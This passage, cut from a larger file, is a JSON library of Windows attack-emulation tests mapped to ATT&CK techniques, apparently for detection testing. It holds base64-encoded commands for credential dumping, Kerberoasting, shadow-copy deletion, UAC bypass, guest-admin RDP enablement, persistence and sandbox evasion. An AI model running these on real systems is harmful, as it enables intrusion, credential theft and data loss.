"ZWNobyBjbWQgL2MgZWNobyAiU2hlbGwgY29kZSBleGVjdXRpb24uIj4gJXRlbXAlXFQxNTY0LjAwNF9oYXNfYWRzX2NtZC50eHQ6YWRzdGVzdC50eHQgJiYgZm9yIC9mICJ1c2ViYWNrcSBkZWxpbXM9PyIgJWkgaW4gKCV0ZW1wJVxUMTU2NC4wMDRfaGFzX2Fkc19jbWQudHh0OmFkc3Rlc3QudHh0KSBkbyAlaQ==", "ability_id": "28862487a99f5f89bc0d68c87396c7e9", "technique_name": "Hide Artifacts: NTFS File Attributes", "additional_info": {}, "privilege": "", "technique_id": "T1564.004", "platform": "windows", "name": "Create ADS command prompt", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["ZGVsICV0ZW1wJVxUMTU2NC4wMDRfaGFzX2Fkc19jbWQudHh0ID5udWwgMj4mMQ=="], "executor": "cmd", "access": {}, "description": "Create an Alternate Data Stream with the command prompt. Write access is required. Upon execution, run \"dir /a-d /s /r | find \":$DATA\"\" in the %temp%\nfolder to view that the alternate data stream exists. To view the data in the alternate data stream, run \"notepad T1564.004_has_ads.txt:adstest.txt\"\n", "variations": []}, {"test": "cG93ZXJzaGVsbC5leGUgLWMgIkdldC1XbWlPYmplY3QgLWNsYXNzIHdpbjMyX29wZXJhdGluZ3N5c3RlbSB8IHNlbGVjdCAtcHJvcGVydHkgKiB8IGV4cG9ydC1jc3YgbXNkZWJ1Zy5sb2ciOw==", "ability_id": "702bfdd2-9947-4eda-b551-c3a1ea9a59a2", "technique_name": "Command and Scripting Interpreter: PowerShell", "additional_info": {}, "privilege": "", "technique_id": "T1059.001", "platform": "windows", "name": "PowerShell information gathering", "requirements": [], "tactic": "collection", "buckets": ["collection"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "System Information Gathering Script", "variations": []}, {"test": "bWtkaXIgLlx0bXBcdmljdGltLWZpbGVzICYmIGNkIC5cdG1wXHZpY3RpbS1maWxlcyAmJiBlY2hvICJUaGlzIGZpbGUgd2lsbCBiZSBlbmNyeXB0ZWQiID4gLlxlbmNyeXB0ZWRfZmlsZS50eHQgJiYgIiVwcm9ncmFtZmlsZXMlL1dpblJBUi9SYXIuZXhlIiBhIC1ocCJibHVlIiBoZWxsby5yYXIgJiYgZGly", "ability_id": "334ea9369058ceadc7b668dae1db2221", "technique_name": "Archive Collected Data: Archive via Utility", "additional_info": {}, "privilege": "", "technique_id": "T1560.001", "platform": "windows", "name": "Compress Data and lock with password for Exfiltration with winrar", "requirements": [], "tactic": "collection", "buckets": ["collection"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Note: Requires winrar installation\nrar a -p\"blue\" hello.rar (VARIANT)\n", "variations": []}, {"test": "aXBjb25maWcgL2FsbCAmJiBuZXRzaCBpbnRlcmZhY2Ugc2hvdyBpbnRlcmZhY2UgJiYgYXJwIC1hICYmIG5idHN0YXQgLW4gJiYgbmV0IGNvbmZpZw==", "ability_id": "7d8ee68f0e9731db82964f558f614608", "technique_name": "System Network Configuration Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1016", "platform": "windows", "name": "System Network Configuration Discovery on Windows", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Identify network configuration information\n\nUpon successful execution, cmd.exe will spawn multiple commands to list network configuration settings. Output will be via stdout.\n", "variations": []}, {"test": "YXR0cmliLmV4ZSArcyAldGVtcCVcVDE1NjQuMDAxLnR4dA==", "ability_id": "dce51e632abdfe5392c7c1f942ac9273", "technique_name": "Hide Artifacts: Hidden Files and Directories", "additional_info": {}, "privilege": "", "technique_id": "T1564.001", "platform": "windows", "name": "Create Windows System File with Attrib", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["ZGVsIC9BOlMgJXRlbXAlXFQxNTY0LjAwMS50eHQgPm51bCAyPiYx"], "executor": "cmd", "access": {}, "description": "Creates a file and marks it as a system file using the attrib.exe utility. Upon execution, open the file in file explorer then open Properties > Details\nand observe that the Attributes are \"SA\" for System and Archive.\n", "variations": []}, {"test": "QzpcV2luZG93c1xzeXN0ZW0zMlxyZWdzdnIzMi5leGUgL3MgL3UgL2k6NDc3NGNkX1JlZ1N2cjMyLnNjdCBzY3JvYmouZGxs", "ability_id": "66f816503d9ef2d1f5165a2da63bfc9c", "technique_name": "Signed Binary Proxy Execution: Regsvr32", "additional_info": {}, "privilege": "", "technique_id": "T1218.010", "platform": "windows", "name": "Regsvr32 local COM scriptlet execution", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["4774cd_RegSvr32.sct"], "cleanup": [], "executor": "cmd", "access": {}, "description": "Regsvr32.exe is a command-line program used to register and unregister OLE controls. Upon execution, calc.exe will be launched.\n", "variations": []}, {"test": "c2h1dGRvd24gL3MgL3QgMQ==", "ability_id": "8badcdf011ce67b8b063255b02bcf3da", "technique_name": "System Shutdown/Reboot", "additional_info": {}, "privilege": "", "technique_id": "T1529", "platform": "windows", "name": "Shutdown System - Windows", "requirements": [], "tactic": "impact", "buckets": ["impact"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "This test shuts down a Windows system.\n", "variations": []}, {"test": "LiBQYXRoVG9BdG9taWNzRm9sZGVyXFQxNTUyLjAwNlxzcmNcR2V0LUdQUFBhc3N3b3JkLnBzMTsgR2V0LUdQUFBhc3N3b3JkIC1WZXJib3Nl", "ability_id": "619ef2b3d36166455fee37eb76c750c2", "technique_name": "Unsecured Credentials: Group Policy Preferences", "additional_info": {}, "privilege": "", "technique_id": "T1552.006", "platform": "windows", "name": "GPP Passwords (Get-GPPPassword)", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller.\nThis test is intended to be run from a domain joined workstation, not on the Domain Controller itself.\nThe Get-GPPPasswords.ps1 executed during this test can be obtained using the get-prereq_commands.\n\nSuccessful test execution will either display the credentials found in the GPP files or indicate \"No preference files found\".\n", "variations": []}, {"test": "QWRkLVR5cGUgLUFzc2VtYmx5TmFtZSBTeXN0ZW0uSWRlbnRpdHlNb2RlbCAgOyBzZXRzcG4uZXhlIC1UICVVU0VSRE5TRE9NQUlOJSAtUSAqLyogfCBTZWxlY3QtU3RyaW5nICdeQ04nIC1Db250ZXh0IDAsMSB8ICUgeyBOZXctT2JqZWN0IFN5c3RlbS5JZGVudGl0eU1vZGVsLlRva2Vucy5LZXJiZXJvc1JlcXVlc3RvclNlY3VyaXR5VG9rZW4gLUFyZ3VtZW50TGlzdCAkXy5Db250ZXh0LlBvc3RDb250ZXh0WzBdLlRyaW0oKSB9", "ability_id": "b46bd28edfd8b70d97f54b823a86a9c6", "technique_name": "Steal or Forge Kerberos Tickets: Kerberoasting", "additional_info": {}, "privilege": "", "technique_id": "T1558.003", "platform": "windows", "name": "Request All Tickets via PowerShell", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "The following test will utilize native PowerShell Identity modules to query the domain to extract allthe Service Principal Names. This behavior is typically used during a kerberos or silver ticket attack. \nA successful execution will output the SPNs for the domain in question.\n", "variations": []}, {"test": "d21pYy5leGUgc2hhZG93Y29weSBkZWxldGU=", "ability_id": "c156ac5c9fa67080365268d95f29053d", "technique_name": "Inhibit System Recovery", "additional_info": {}, "privilege": "", "technique_id": "T1490", "platform": "windows", "name": "Windows - Delete Volume Shadow Copies via WMI", "requirements": [], "tactic": "impact", "buckets": ["impact"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Deletes Windows Volume Shadow Copies via WMI. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer.\nShadow copies can only be created on Windows server or Windows 8.\n", "variations": []}, {"test": "MTIwMTFjX0FkRmluZC5leGUgLWYgKG9iamVjdGNhdGVnb3J5PW9yZ2FuaXphdGlvbmFsVW5pdCk=", "ability_id": "a02c1389fc991a46cea0f76ab23fc096", "technique_name": "Domain Trust Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1482", "platform": "windows", "name": "Adfind - Enumerate Active Directory OUs", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["12011c_AdFind.exe"], "cleanup": [], "executor": "cmd", "access": {}, "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory OUs\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n", "variations": []}, {"test": "cmVnIGFkZCBIS0xNXFNZU1RFTVxDdXJyZW50Q29udHJvbFNldFxDb250cm9sXFNlY3VyaXR5UHJvdmlkZXJzXFdEaWdlc3QgL3YgVXNlTG9nb25DcmVkZW50aWFsIC90IFJFR19EV09SRCAvZCAxIC9m", "ability_id": "8ef0e743e8f073af665288aaf631a71a", "technique_name": "Modify Registry", "additional_info": {}, "privilege": "", "technique_id": "T1112", "platform": "windows", "name": "Modify registry to store logon credentials", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["cmVnIGFkZCBIS0xNXFNZU1RFTVxDdXJyZW50Q29udHJvbFNldFxDb250cm9sXFNlY3VyaXR5UHJvdmlkZXJzXFdEaWdlc3QgL3YgVXNlTG9nb25DcmVkZW50aWFsIC90IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4mMQ=="], "executor": "cmd", "access": {}, "description": "Sets registry key that will tell windows to store plaintext passwords (making the system vulnerable to clear text / cleartext password dumping).\nUpon execution, the message \"The operation completed successfully.\" will be displayed.\nAdditionally, open Registry Editor to view the modified entry in HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest.\n", "variations": []}, {"test": "bmV0IHVzZXIgI3tndWVzdF91c2VyfSAvYWN0aXZlOnllcyAmJiBuZXQgdXNlciAje2d1ZXN0X3VzZXJ9ICN7Z3Vlc3RfcGFzc3dvcmR9ICYmIG5ldCBsb2NhbGdyb3VwICN7bG9jYWxfYWRtaW5fZ3JvdXB9ICN7Z3Vlc3RfdXNlcn0gL2FkZCAmJiBuZXQgbG9jYWxncm91cCAiI3tyZW1vdGVfZGVza3RvcF91c2Vyc19ncm91cF9uYW1lfSIgI3tndWVzdF91c2VyfSAvYWRkICYmIHJlZyBhZGQgImhrbG1cc3lzdGVtXEN1cnJlbnRDb250cm9sU2V0XENvbnRyb2xcVGVybWluYWwgU2VydmVyIiAvdiBmRGVueVRTQ29ubmVjdGlvbnMgL3QgUkVHX0RXT1JEIC9kIDAgL2YgJiYgcmVnIGFkZCAiaGtsbVxzeXN0ZW1cQ3VycmVudENvbnRyb2xTZXRcQ29udHJvbFxUZXJtaW5hbCBTZXJ2ZXIiIC92ICJBbGxvd1RTQ29ubmVjdGlvbnMiIC90IFJFR19EV09SRCAvZCAweDEgL2Y=", "ability_id": "e86ecfb7e9a88077f34ad0660561e35b", "technique_name": "Valid Accounts: Default Accounts", "additional_info": {}, "privilege": "", "technique_id": "T1078.001", "platform": "windows", "name": "Enable Guest account with RDP capability and admin privileges", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["bmV0IHVzZXIgI3tndWVzdF91c2VyfSAvYWN0aXZlOm5vID5udWwgMj4mMSAmJiBuZXQgbG9jYWxncm91cCAje2xvY2FsX2FkbWluX2dyb3VwfSAje2d1ZXN0X3VzZXJ9IC9kZWxldGUgPm51bCAyPiYxICYmIG5ldCBsb2NhbGdyb3VwICIje3JlbW90ZV9kZXNrdG9wX3VzZXJzX2dyb3VwX25hbWV9IiAje2d1ZXN0X3VzZXJ9IC9kZWxldGUgPm51bCAyPiYxICYmIGlmICN7cmVtb3ZlX3JkcF9hY2Nlc3NfZHVyaW5nX2NsZWFudXB9IE5FUSAxIChlY2hvIE5vdGU6IHNldCByZW1vdmVfcmRwX2FjY2Vzc19kdXJpbmdfY2xlYW51cCBpbnB1dCBhcmd1bWVudCB0byBkaXNhYmxlIFJEUCBhY2Nlc3MgZHVyaW5nIGNsZWFudXApICYmIGlmICN7cmVtb3ZlX3JkcF9hY2Nlc3NfZHVyaW5nX2NsZWFudXB9IEVRVSAxIChyZWcgZGVsZXRlICJoa2xtXHN5c3RlbVxDdXJyZW50Q29udHJvbFNldFxDb250cm9sXFRlcm1pbmFsIFNlcnZlciIgL3YgZkRlbnlUU0Nvbm5lY3Rpb25zIC9mID5udWwgMj4mMSkgJiYgaWYgI3tyZW1vdmVfcmRwX2FjY2Vzc19kdXJpbmdfY2xlYW51cH0gRVFVIDEgKHJlZyBkZWxldGUgImhrbG1cc3lzdGVtXEN1cnJlbnRDb250cm9sU2V0XENvbnRyb2xcVGVybWluYWwgU2VydmVyIiAvdiAiQWxsb3dUU0Nvbm5lY3Rpb25zIiAvZiA+bnVsIDI+JjEp"], "executor": "cmd", "access": {}, "description": "After execution the Default Guest account will be enabled (Active) and added to Administrators and Remote Desktop Users Group,\nand desktop will allow multiple RDP connections.\n", "variations": []}, {"test": "cmVnIGFkZCAiSEtFWV9DVVJSRU5UX1VTRVJcU29mdHdhcmVcTWljcm9zb2Z0XE9mZmljZSB0ZXN0XFNwZWNpYWxcUGVyZiIgL3QgUkVHX1NaIC9kICJDOlxQYXRoXEF0b21pY1JlZFRlYW0uZGxsIg==", "ability_id": "e2af3c3ab1b0f659c874b8af58c49759", "technique_name": "Office Application Startup: Office Test", "additional_info": {}, "privilege": "", "technique_id": "T1137.002", "platform": "windows", "name": "Office Application Startup Test Persistence", "requirements": [], "tactic": "persistence", "buckets": ["persistence"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["cmVnIGRlbGV0ZSAiSEtFWV9DVVJSRU5UX1VTRVJcU29mdHdhcmVcTWljcm9zb2Z0XE9mZmljZSB0ZXN0XFNwZWNpYWxcUGVyZiIgL2YgPm51bCAyPiYx"], "executor": "cmd", "access": {}, "description": "Office Test Registry location exists that allows a user to specify an arbitrary DLL that will be executed every time an Office\napplication is started. Key is used for debugging purposes. Not created by default & exist in HKCU & HKLM hives.\n", "variations": []}, {"test": "ZWNobyBbSW50ZXJuZXRTaG9ydGN1dF0gPiAldGVtcCVcVDE1NDcuMDA5X21vZGlmaWVkX3Nob3J0Y3V0LnVybCAmJiBlY2hvIFVSTD1DOlx3aW5kb3dzXHN5c3RlbTMyXGNhbGMuZXhlID4+ICV0ZW1wJVxUMTU0Ny4wMDlfbW9kaWZpZWRfc2hvcnRjdXQudXJsICYmICV0ZW1wJVxUMTU0Ny4wMDlfbW9kaWZpZWRfc2hvcnRjdXQudXJs", "ability_id": "b6e5c895c6709fe289352ee23f062229", "technique_name": "Boot or Logon Autostart Execution: Shortcut Modification", "additional_info": {}, "privilege": "", "technique_id": "T1547.009", "platform": "windows", "name": "Shortcut Modification", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["ZGVsIC1mICV0ZW1wJVxUMTU0Ny4wMDlfbW9kaWZpZWRfc2hvcnRjdXQudXJsID5udWwgMj4mMQ=="], "executor": "cmd", "access": {}, "description": "This test to simulate shortcut modification and then execute. example shortcut (*.lnk , .url) strings check with powershell;\ngci -path \"C:\\Users\" -recurse -include *.url -ea SilentlyContinue | Select-String -Pattern \"exe\" | FL.\nUpon execution, calc.exe will be launched.\n", "variations": []}, {"test": "d2hlcmUgL1IgQzpcVXNlcnNcIHBsYWNlcy5zcWxpdGU=", "ability_id": "f7a0f7d704aa52a764d9d1bee81e65d6", "technique_name": "Browser Bookmark Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1217", "platform": "windows", "name": "List Mozilla Firefox bookmarks on Windows with command prompt", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Searches for Mozilla Firefox bookmarks file (on Windows distributions) that contains bookmarks in a SQLITE database.\nUpon execution, paths that contain bookmark files will be displayed.\n", "variations": []}, {"test": "UGF0aFRvQXRvbWljc0ZvbGRlclxUMTAwM1xiaW5cZ3NlY2R1bXAuZXhlIC1h", "ability_id": "fb55a593b131549b6ee4234f917bbf4d", "technique_name": "OS Credential Dumping", "additional_info": {}, "privilege": "", "technique_id": "T1003", "platform": "windows", "name": "Gsecdump", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Dump credentials from memory using Gsecdump.\n\nUpon successful execution, you should see domain\\username's following by two 32 characters hashes.\n\nIf you see output that says \"compat: error: failed to create child process\", execution was likely blocked by Anti-Virus. \nYou will receive only error output if you do not run this test from an elevated context (run as administrator)\n\nIf you see a message saying \"The system cannot find the path specified\", try using the get-prereq_commands to download and install Gsecdump first.\n", "variations": []}, {"test": "Y29uaG9zdC5leGUgIm5vdGVwYWQuZXhlIg==", "ability_id": "ec8d7a83a6728d8095ef6e4a85a5eb37", "technique_name": "Indirect Command Execution", "additional_info": {}, "privilege": "", "technique_id": "T1202", "platform": "windows", "name": "Indirect Command Execution - conhost.exe", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "conhost.exe refers to a host process for the console window. It provide an interface between command prompt and Windows explorer.\nExecuting it through command line can create process ancestry anomalies\n[Reference] (http://www.hexacorn.com/blog/2020/05/25/how-to-con-your-host/)\n", "variations": []}, {"test": "VGVzdC1OZXRDb25uZWN0aW9uIC1Db21wdXRlck5hbWUgZ29vZ2xlLmNvbSAtcG9ydCA4MDgx", "ability_id": "f10e7bf9333135cc84a1924dcd61d152", "technique_name": "Non-Standard Port", "additional_info": {}, "privilege": "", "technique_id": "T1571", "platform": "windows", "name": "Testing usage of uncommonly used port with PowerShell", "requirements": [], "tactic": "command-and-control", "buckets": ["command-and-control"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Testing uncommonly used port utilizing PowerShell. APT33 has been known to attempt telnet over port 8081. Upon execution, details about the successful\nport check will be displayed.\n", "variations": []}, {"test": "JGZvcmVuc2ljUHJvY2Vzc2VzID0gQCggICAgImFwaW1vbml0b3IteDY0IiwgICAgImFwaW1vbml0b3IteDg2IiwgICAgImF1dG9wc3k2NCIsICAgICJhdXRvcHN5IiwgICAgImF1dG9ydW5zNjQiLCAgICAiYXV0b3J1bnMiLCAgICAiYXV0b3J1bnNjNjQiLCAgICAiYXV0b3J1bnNjIiwgICAgImJpbmFyeW5pbmphIiwgICAgImJsYWNrbGlnaHQiLCAgICAiY2ZmIGV4cGxvcmVyIiwgICAgImN1dHRlciIsICAgICJkZTRkb3QiLCAgICAiZGVidWd2aWV3IiwgICAgImRpc2ttb24iLCAgICAiZG5zZCIsICAgICJkbnNweSIsICAgICJkb3RwZWVrMzIiLCAgICAiZG90cGVlazY0IiwgICAgImR1bXBjYXAiLCAgICAiZXZpZGVuY2UgY2VudGVyIiwgICAgImV4ZWluZm9wZSIsICAgICJmYWtlZG5zIiwgICAgImZha2VuZXQiLCAgICAiZmZkZWMiLCAgICAiZmlkZGxlciIsICAgICJmaWxlaW5zaWdodCIsICAgICJmbG9zcyIsICAgICJnZGIiLCAgICAiaGlldzMyZGVtbyIsICAgICJoaWV3MzIiLCAgICAiaG9sbG93c19odW50ZXIiLCAgICAiaWRhcTY0IiwgICAgImlkYXEiLCAgICAiaWRyIiwgICAgImlsZGFzbSIsICAgICJpbHNweSIsICAgICJqZC1ndWkiLCAgICAibG9yZHBlIiwgICAgIm9mZmljZW1hbHNjYW5uZXIiLCAgICAib2xseWRiZyIsICAgICJwZGZzdHJlYW1kdW1wZXIiLCAgICAicGUtYmVhciIsICAgICJwZWJyb3dzZTY0IiwgICAgInBlaWQiLCAgICAicGUtc2lldmUzMiIsICAgICJwZS1zaWV2ZTY0IiwgICAgInBlc3R1ZGlvIiwgICAgInBldmlldyIsICAgICJwcGVlIiwgICAgInByb2NkdW1wNjQiLCAgICAicHJvY2R1bXAiLCAgICAicHJvY2Vzc2hhY2tlciIsICAgICJwcm9jZXhwNjQiLCAgICAicHJvY2V4cCIsICAgICJwcm9jbW9uIiwgICAgInByb2Rpc2NvdmVyYmFzaWMiLCAgICAicHkyZXhlZGVjb21waWxlciIsICAgICJyMmFnZW50IiwgICAgInJhYmluMiIsICAgICJyYWRhcmUyIiwgICAgInJhbWNhcHR1cmU2NCIsICAgICJyYW1jYXB0dXJlIiwgICAgInJlZmxlY3RvciIsICAgICJyZWdtb24iLCAgICAicmVzb3VyY2VoYWNrZXIiLCAgICAicmV0ZGVjLWFyLWV4dHJhY3RvciIsICAgICJyZXRkZWMtYmluMmxsdm1pciIsICAgICJyZXRkZWMtYmluMnBhdCIsICAgICJyZXRkZWMtY29uZmlnIiwgICAgInJldGRlYy1maWxlaW5mbyIsICAgICJyZXRkZWMtZ2V0c2lnIiwgICAgInJldGRlYy1pZHIycGF0IiwgICAgInJldGRlYy1sbHZtaXIyaGxsIiwgICAgInJldGRlYy1tYWNoby1leHRyYWN0b3IiLCAgICAicmV0ZGVjLXBhdDJ5YXJhIiwgICAgInJldGRlYy1zdGFjb2ZpbiIsICAgICJyZXRkZWMtdW5wYWNrZXIiLCAgICAicmV0ZGVjLXlhcmFjIiwgICAgInJ1bmRvdG5ldGRsbCIsICAgICJzYmllc3ZjIiwgICAgInNjZGJnIiwgICAgInNjeWxsYV94NjQiLCAgICAic2N5bGxhX3g4NiIsICAgICJzaGVsbGNvZGVfbGF1bmNoZXIiLCAgICAic29sYXJ3aW5kc2RpYWdub3N0aWNzIiwgICAgInN5c21vbjY0IiwgICAgInN5c21vbiIsICAgICJ0YXNrIGV4cGxvcmVyIiwgICAgInRhc2sgZXhwbG9yZXIteDY0IiwgICAgInRjcGR1bXAiLCAgICAidGNwdmNvbiIsICAgICJ0Y3B2aWV3IiwgICAgInZib3hzZXJ2aWNlIiwgICAgIndpbjMyX3JlbW90ZSIsICAgICJ3aW42NF9yZW1vdGV4NjQiLCAgICAid2luZGJnIiwgICAgIndpbmR1bXAiLCAgICAid2luaGV4NjQiLCAgICAid2luaGV4IiwgICAgIndpbm9iaiIsICAgICJ3aXJlc2hhcmsiLCAgICAieDMyZGJnIiwgICAgIng2NGRiZyIsICAgICJ4d2ZvcmVuc2ljczY0IiwgICAgInh3Zm9yZW5zaWNzIiwgICAgInJlZGNsb2FrIiwgICAgImF2Z3N2YyIsICAgICJhdmd1aSIsICAgICJhdmdzdmNhIiwgICAgImF2Z2lkc2FnZW50IiwgICAgImF2Z3N2Y3giLCAgICAiYXZnd2RzdmN4IiwgICAgImF2Z2FkbWluY2xpZW50c2VydmljZSIsICAgICJhZndzZXJ2IiwgICAgImF2YXN0dWkiLCAgICAiYXZhc3RzdmMiLCAgICAiYXN3aWRzYWdlbnQiLCAgICAiYXN3aWRzYWdlbnRhIiwgICAgImFzd2VuZ3NydiIsICAgICJhdmFzdGF2d3JhcHBlciIsICAgICJiY2NhdnN2YyIsICAgICJwc2FuaG9zdCIsICAgICJwc3Vhc2VydmljZSIsICAgICJwc3VhbWFpbiIsICAgICJhdnAiLCAgICAiYXZwdWkiLCAgICAia3NkZSIsICAgICJrc2RldWkiLCAgICAidGFuaXVtIiwgICAgInRhbml1bWNsaWVudCIsICAgICJ0YW5pdW1kZXRlY3RlbmdpbmUiLCAgICAidGFuaXVtZW5kcG9pbnRpbmRleCIsICAgICJ0YW5pdW10cmFjZWNsaSIsICAgICJ0YW5pdW10cmFjZXdlYnNvY2tldGNsaWVudDY0Iik7ZnVuY3Rpb24gRmluZC1Gb3JlbnNpY1Byb2Nlc3NlcyB7ICAgIHBhcmFtICggICAgICAgICRGb3JlbnNpY1Byb2Nlc3NMaXN0ICAgICk7ICAgICRDdXJyZW50UHJvY2Vzc2VzID0gR2V0LVByb2Nlc3MgfCBTb3J0LU9iamVjdCB8IFNlbGVjdC1PYmplY3QgLVByb3BlcnR5IE5hbWUgfCBHZXQtVW5pcXVlIC1Bc1N0cmluZzsgICAgZm9yZWFjaCAoJHByb2MgaW4gJEN1cnJlbnRQcm9jZXNzZXMpIHsgICAgICAgIGZvcmVhY2ggKCRmb3JlbnNpY1Byb2MgaW4gJEZvcmVuc2ljUHJvY2Vzc0xpc3QpIHsgICAgICAgICAgICBpZiAoJHByb2MubmFtZSAtbGlrZSAkZm9yZW5zaWNQcm9jKSB7ICAgICAgICAgICAgICAgICRwcm9jUGF0aCA9IEdldC1Qcm9jZXNzIC1OYW1lICRwcm9jLk5hbWUgfCBTb3J0LU9iamVjdCB8IFNlbGVjdC1PYmplY3QgLVByb3BlcnR5IFBhdGggfCBHZXQtVW5pcXVlOyAgICAgICAgICAgICAgICBXcml0ZS1Ib3N0ICJbIV0gRm9yZW5zaWMgcHJvY2VzcyBmb3VuZDogIiAkcHJvYy5OYW1lOyAgICAgICAgICAgICAgICBXcml0ZS1Ib3N0ICJbIV0gUGF0aDogIiAkcHJvY1BhdGguUGF0aDsgICAgICAgICAgICB9ICAgICAgICB9ICAgIH19RmluZC1Gb3JlbnNpY1Byb2Nlc3NlcygkZm9yZW5zaWNQcm9jZXNzZXMpOw==", "ability_id": "7a6ba833-de40-466a-8969-5c37b13603e0", "technique_name": "Virtualization/Sandbox Evasion: System Checks", "additional_info": {}, "privilege": "", "technique_id": "T1497.001", "platform": "windows", "name": "Check analysis environment processes", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Check for analysis/sandbox environment processes. Process black list is based on the SUNBURST malware observed in a Solarwinds related compromise (https://research.checkpoint.com/2020/sunburst-teardrop-and-the-netsec-new-normal/).", "variations": []}, {"test": "TmV3LUl0ZW0gIkhLQ1U6XHNvZnR3YXJlXGNsYXNzZXNcbXMtc2V0dGluZ3Ncc2hlbGxcb3Blblxjb21tYW5kIiAtRm9yY2U7IE5ldy1JdGVtUHJvcGVydHkgIkhLQ1U6XHNvZnR3YXJlXGNsYXNzZXNcbXMtc2V0dGluZ3Ncc2hlbGxcb3Blblxjb21tYW5kIiAtTmFtZSAiRGVsZWdhdGVFeGVjdXRlIiAtVmFsdWUgIiIgLUZvcmNlOyBTZXQtSXRlbVByb3BlcnR5ICJIS0NVOlxzb2Z0d2FyZVxjbGFzc2VzXG1zLXNldHRpbmdzXHNoZWxsXG9wZW5cY29tbWFuZCIgLU5hbWUgIihkZWZhdWx0KSIgLVZhbHVlICJDOlxXaW5kb3dzXFN5c3RlbTMyXGNtZC5leGUiIC1Gb3JjZTsgU3RhcnQtUHJvY2VzcyAiQzpcV2luZG93c1xTeXN0ZW0zMlxDb21wdXRlckRlZmF1bHRzLmV4ZSI=", "ability_id": "09f12d8d4611f88f40e0be1a8c036027", "technique_name": "Abuse Elevation Control Mechanism: Bypass User Access Control", "additional_info": {}, "privilege": "", "technique_id": "T1548.002", "platform": "windows", "name": "Bypass UAC using ComputerDefaults (PowerShell)", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UmVtb3ZlLUl0ZW0gIkhLQ1U6XHNvZnR3YXJlXGNsYXNzZXNcbXMtc2V0dGluZ3MiIC1mb3JjZSAtUmVjdXJzZSAtRXJyb3JBY3Rpb24gSWdub3Jl"], "executor": "psh", "access": {}, "description": "PowerShell code to bypass User Account Control using ComputerDefaults.exe on Windows 10\nUpon execution administrative command prompt should open\n", "variations": []}, {"test": "cmVnIEFERCAiSEtDUlxDTFNJRFx7NjQ1RkYwNDAtNTA4MS0xMDFCLTlGMDgtMDBBQTAwMkY5NTRFfVxzaGVsbFxvcGVuXGNvbW1hbmQiIC92ZSAvZCAiY2FsYy5leGUiIC9m", "ability_id": "0dbdf1a2a87e718a6ac8a8e3415a7fac", "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder", "additional_info": {}, "privilege": "", "technique_id": "T1547.001", "platform": "windows", "name": "Add persistance via Recycle bin", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["cmVnIERFTEVURSAiSEtDUlxDTFNJRFx7NjQ1RkYwNDAtNTA4MS0xMDFCLTlGMDgtMDBBQTAwMkY5NTRFfVxzaGVsbFxvcGVuIiAvZg=="], "executor": "cmd", "access": {}, "description": "Add a persistance via Recycle bin [vxunderground](https://github.com/vxunderground/VXUG-Papers/blob/main/The%20Persistence%20Series/Persistence%20via%20Recycle%20Bin/Persistence_via_Recycle_Bin.pdf)\nUser have to clic on the recycle bin to lauch the payload (here calc)\n", "variations": []}, {"test": 